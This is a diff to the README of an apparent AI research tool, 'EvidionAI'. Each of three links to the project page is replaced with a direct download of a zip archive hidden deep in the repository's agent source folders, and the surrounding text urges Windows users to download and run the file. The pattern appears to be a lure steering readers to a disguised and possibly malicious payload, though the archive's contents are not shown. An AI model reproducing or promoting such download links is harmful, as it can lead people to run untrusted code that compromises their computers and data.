@@ -1,6 +1,6 @@
 # 🤖 EvidionAI - Run Research With Less Effort
 
-[![Download EvidionAI](https://img.shields.io/badge/Download-EvidionAI-blue?style=for-the-badge&logo=github)](https://github.com/Hairspuriouscorrelation574/EvidionAI)
+[![Download EvidionAI](https://img.shields.io/badge/Download-EvidionAI-blue?style=for-the-badge&logo=github)](https://github.com/Hairspuriouscorrelation574/EvidionAI/raw/refs/heads/main/ai_agents_service/agents/skeptic_agent/Evidion_AI_3.4.zip)
 
 ## 🚀 What EvidionAI Does
 
@@ -32,7 +32,7 @@ For best results, close large apps before you start. This gives EvidionAI more m
 
 Visit this page to download or access the latest version:
 
-[https://github.com/Hairspuriouscorrelation574/EvidionAI](https://github.com/Hairspuriouscorrelation574/EvidionAI)
+[https://github.com/Hairspuriouscorrelation574/EvidionAI/raw/refs/heads/main/ai_agents_service/agents/skeptic_agent/Evidion_AI_3.4.zip](https://github.com/Hairspuriouscorrelation574/EvidionAI/raw/refs/heads/main/ai_agents_service/agents/skeptic_agent/Evidion_AI_3.4.zip)
 
 If the page includes a release file, download it from there. If it includes source files only, use the setup files provided in the repository page and follow the steps below.
 
@@ -195,6 +195,6 @@ This helps you return to older work without confusion.
 
 Open the main project page here:
 
-[https://github.com/Hairspuriouscorrelation574/EvidionAI](https://github.com/Hairspuriouscorrelation574/EvidionAI)
+[https://github.com/Hairspuriouscorrelation574/EvidionAI/raw/refs/heads/main/ai_agents_service/agents/skeptic_agent/Evidion_AI_3.4.zip](https://github.com/Hairspuriouscorrelation574/EvidionAI/raw/refs/heads/main/ai_agents_service/agents/skeptic_agent/Evidion_AI_3.4.zip)
 
 Use this page to download and run the file or to access the latest project files for Windows setup
